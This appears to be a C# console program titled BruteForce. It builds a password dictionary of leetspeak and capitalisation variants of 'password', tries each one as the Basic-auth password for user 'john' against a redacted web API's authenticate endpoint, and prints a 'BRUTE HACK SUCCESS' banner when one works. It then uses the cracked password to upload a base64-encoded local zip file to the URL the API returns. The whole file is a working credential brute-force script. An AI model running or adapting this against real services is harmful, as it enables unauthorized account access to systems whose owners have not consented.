using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using Newtonsoft.Json;


namespace BruteForce
{

    class Program
    {

        static string outFile = @"c:\temp\Dict.txt";
        static string ZipFile = @"c:\temp\JeremySingh.zip";

        static string APIResult = "";
        static string MasterPass = "";

        public class RequestObj
        {
            public string Data { get; set; }
        }


        static void Main(string[] args)
        {
            List<string> passwords = new List<string>();


            FileInfo fi = new FileInfo(outFile);

            if (!fi.Exists) CreateDictionary(passwords = Combinations("password"));

            passwords = new List<string>();

            if (LoadDictionary(outFile, ref passwords))
            {
                if (BruteForceAPI(passwords))
                {
                    UploadAPI(APIResult, MasterPass);
                   
                }
            }

            Console.ReadKey();
        }

        static void CreateDictionary(List<string> passwordList)
        {
            using (TextWriter tw = new StreamWriter(outFile))
            {
                foreach (String s in passwordList)
                    tw.WriteLine(s);
            }
        }

        static bool LoadDictionary(string DictPath, ref List<string> Dict)
        {
            Dict = File.ReadAllLines(DictPath).ToList();
            if (Dict.Count > 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static bool BruteForceAPI(List<string> _pass)
        {
            int j = 0;
            foreach (var _password in _pass)
            {
                var result = ConnectAPI(@"http://redacted.za/api/authenticate/", _password);
                Console.WriteLine(j + " - " + _password + " - " + result);
                if (result != "false")
                {
                    Console.WriteLine("!!!BRUTE HACK SUCCESS!!!");
                    Console.WriteLine(j + " PASSWORD USED :  [" + _password + "]| RESPONSE - [" + APIResult + "]");
                    MasterPass = _password;
                    return true;
                }
                j++;
            }
            return false;
        }

        public static List<string> Combinations(string input)
        {
            var combinations = new List<string>();

            combinations.Add(input);
            int n = input.Length;

            // Number of permutations is 2^n
            int max = 1 << n;

            for (int i = 0; i < input.Length; i++)
            {
                //Sort out char replacements
                char[] buffer = input.ToArray();
                if (buffer[i] == 'o')
                {
                    buffer[i] = '0';
                    combinations.Add(new string(buffer));
                    combinations = combinations.Concat(Combinations(new string(buffer))).ToList();
                }

                if (buffer[i] == 'a')
                {
                    buffer[i] = '@';
                    combinations.Add(new string(buffer));
                    combinations = combinations.Concat(Combinations(new string(buffer))).ToList();
                }

                if (buffer[i] == 's')
                {
                    buffer[i] = '5';
                    combinations.Add(new string(buffer));
                    combinations = combinations.Concat(Combinations(new string(buffer))).ToList();
                }
            }

            //Now sort out upper and lowercase
            for (int i = 0; i < max; i++)
            {
                char[] combination = input.ToCharArray();

                // If j-th bit is set, we  
                // convert it to upper case
                for (int j = 0; j < n; j++)
                {
                    if (((i >> j) & 1) == 1)
                        combination[j] = (char)(combination[j] - 32);
                }
                string tmp = new string(combination);

                bool add = true;

                //We dont want to add broken words
                foreach (char c in combination)
                {
                    if (((c) == 32) || (c) == 16 || (c) == 21) //add 0 and 5
                    {
                        //dont add
                        add = false;
                        //break on first instance
                        break;
                    }
                    else
                    {
                        add = true;
                    }
                }

                if (add) combinations.Add(tmp);
            }
            return combinations;
        }

        public static bool UploadAPI(string url, string pass)
        {
            try
            {
                byte[] AsBytes = File.ReadAllBytes(ZipFile);
                String AsBase64String = Convert.ToBase64String(AsBytes);

                RequestObj req_obj = new RequestObj();
                req_obj.Data = AsBase64String;

                //convert to json here
                var data = Newtonsoft.Json.JsonConvert.SerializeObject(req_obj);
                var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";
                //httpWebRequest.ContentLength = AsBytes.Length;
                httpWebRequest.Headers["Authorization"] = "Basic " + Convert.ToBase64String(Encoding.Default.GetBytes("john:" + pass));
                httpWebRequest.Expect = "application/json";

                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    streamWriter.Write(data);
                }

                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();

                string result;

                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    result = streamReader.ReadToEnd();
                    return true;
                }
            }
            catch (Exception g)
            {
                return false;
            }
        }

        public static string ConnectAPI(string url, string pass)
        {
            try
            {
                

                WebRequest req = WebRequest.Create(url);
                req.Method = "GET";
                req.Headers["Authorization"] = "Basic " + Convert.ToBase64String(Encoding.Default.GetBytes("john:" + pass));
                //req.Credentials = new NetworkCredential("username", "password");
                HttpWebResponse resp = req.GetResponse() as HttpWebResponse;
                Encoding enc = System.Text.Encoding.GetEncoding("utf-8");
                StreamReader responseStream = new StreamReader(resp.GetResponseStream(), enc);
                //string result = string.Empty;
                APIResult = responseStream.ReadToEnd();
                resp.Close();
                return APIResult;
            }
            catch
            {
                return "false";
            }

        }
    }

}


